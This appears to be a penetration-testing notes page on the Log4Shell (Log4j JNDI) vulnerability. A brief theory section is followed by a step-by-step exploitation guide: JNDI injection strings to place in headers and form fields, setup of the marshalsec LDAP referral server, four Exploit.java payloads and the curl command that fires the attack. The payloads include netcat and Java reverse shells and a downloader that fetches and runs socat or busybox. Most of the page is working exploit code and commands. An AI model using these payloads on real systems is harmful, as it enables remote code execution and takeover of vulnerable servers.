# log4shell

## Theory

The vulnerability is introduced in Log4j because it supports a [**special syntax**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) in the form `${prefix:name}` where `prefix` is one of a number of different [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) where `name` should be evaluated. For example, `${java:version}` is the current running version of Java.

In [**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) added a `jndi` Lookup as follows: “The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp/env/, however if the key contains a **":" no prefix will be added**.”

With a **: present** in the key, as in `${jndi:ldap://example.com/a}` there’s **no prefix** and the **LDAP server is queried for the object**. And these Lookups can be used in both the configuration of Log4j as well as when lines are logged.

Therefore, the only thing needed to get RCE a **vulnerable version of Log4j processing information controlled by the user**. And because this is a library widely used by Java applications to log information (Internet facing applications included) it was very common to have log4j logging for example HTTP headers received like the User-Agent. However, log4j is **not used to log only HTTP information but any input** and data the developer indicated.

## Practice

### Detection

You can simply supply HTTP GET variables or parameters where you suspect they will be processed and parsed by log4j. All that is needed is this single line of text:

```bash
${jndi:ldap://<LHOST>:<LPORT>} # Ex: ${jndi:ldap://10.10.10.10:443}
${jndi:rmi://<LHOST>:<LPORT>}
```

Other locations you might supply this JNDI syntax:

* Input boxes, user and password login forms, data entry points within applications
* HTTP headers such as `User-Agent`, `X-Forwarded-For`, `X-Api-Version`, or other customizable headers
* **Any place for user-supplied data**

If when entering the payload we see that we receive a connection by **nc**, then we can confirm that it is vulnerable.

### Concept

We will utilize a open-source and public utility to stage an "**LDAP Referral Server**". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:

1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server
2. LDAP Referral Server springboards the request to a secondary `http://attackerserver/resource`
3. The victim retrieves and executes the code present in `http://attackerserver/resource`

### Requirements

#### Java 8

```bash
# Check java version:
java -version
# Install Java 8 for Debian/Ubuntu:
sudo mkdir /usr/lib/jvm
cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz # modify as needed
sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
# Install Java 8 for Arch Linux:
sudo pacman -S jdk8-openjdk
archlinux-java status
sudo archlinux-java set java-8-openjdk
```

#### LDAP Referral Server

```
git clone https://github.com/mbechler/marshalsec
```

#### maven

```bash
sudo apt install maven # Debian/Ubuntu
sudo pacman -S maven # Arch Linux
```

#### Exploit.java

{% tabs %}
{% tab title="#1" %}
Simple command execution:

{% code title="Exploit.java" %}
```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <LHOST> 443");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="#2" %}
Reverse shell:

{% code title="Exploit.java" %}
```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host="<LHOST>";
        int port=<LPORT>;
        String cmd="/bin/sh"; // You can change it to a bash.
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}

```
{% endcode %}
{% endtab %}

{% tab title="#3" %}
Reverse shell with socat or busybox. This payload uploads the static binary (from our HTTP server) to the compromised machine and then executes it:

```java
import java.io.InputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.net.URL;

public class Exploit {
  static {
    String URL = "http://<LHOST>/<socat-busybox>";
    String FILE_PATH = "/tmp/<socat-busybox>"; // <DIR_PATH>/<FILENAME>
    String CMD = "./socat TCP:<LHOST>:443 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane &"; // socat
    // String cmd = "<FILE_PATH>/busybox nc <LHOST> 443 -e <FILE_PATH>/busybox sh"; // busybox
    try {
      InputStream in = new URL(URL).openStream();
      Files.copy(in, Paths.get(FILE_PATH), StandardCopyOption.REPLACE_EXISTING);

      File file = new File(FILE_PATH);

      if(file.exists()){
        file.setReadable(true);
        file.setExecutable(true);
        file.setWritable(false);
      }
      // Execute a command that gives us a reverse shell (optional):
      // Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", CMD}); // Other way.
      Runtime r = Runtime.getRuntime();
      Process p = r.exec(CMD);
      p.waitFor();
    } catch (Exception e){
    }
  }
}
```

Don't forget to contact **socat** as follows:

```bash
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
```
{% endtab %}

{% tab title="#4" %}
Upload a file (Example with busybox):

```java
import java.io.InputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.net.URL;

public class Exploit {
  static{
    String URL = "http://<LHOST>/busybox";
    String FILE_PATH = "/tmp/busybox"; // <DIR_PATH>/<FILENAME>
    try {
      InputStream in = new URL(URL).openStream();
      Files.copy(in, Paths.get(FILE_PATH), StandardCopyOption.REPLACE_EXISTING);

      File file = new File(FILE_PATH);
      if(file.exists()){
        file.setReadable(true);
        file.setExecutable(true);
        file.setWritable(false);
      }
    } catch (Exception e){
    }
  }
}
```
{% endtab %}
{% endtabs %}

### Exploitation

Run the command to build the **marshalsec** utility:

```bash
cd marshalsec
mvn clean package -DskipTests
```

With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server:

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>/#Exploit"
```

Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. We will use the **Exploit.java** payload created earlier in the requirements section and compile it:

```bash
javac Exploit.java -source 8 -target 8
```

With your payload created and compiled, you can now host it by spinning up a temporary HTTP server:

```bash
sudo python3 -m http.server 80
```

{% hint style="danger" %}
Don't forget to listen to **nc** or **socat** to receive the reverse shell.
{% endhint %}

Finally, all that remains to be done is to activate the exploit and fire our JNDI syntax. Now the port will be 1389 to refer to our LDAP server, also specifying our exploit. An example with a GET request through a parameter with the **curl** tool:

```bash
curl 'http://10.10.10.10:8000/?test=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
```

{% hint style="danger" %}
You must escape out the **{ }** curly braces with a single backslash character, so those are not misrepresented in the curl command arguments.
{% endhint %}
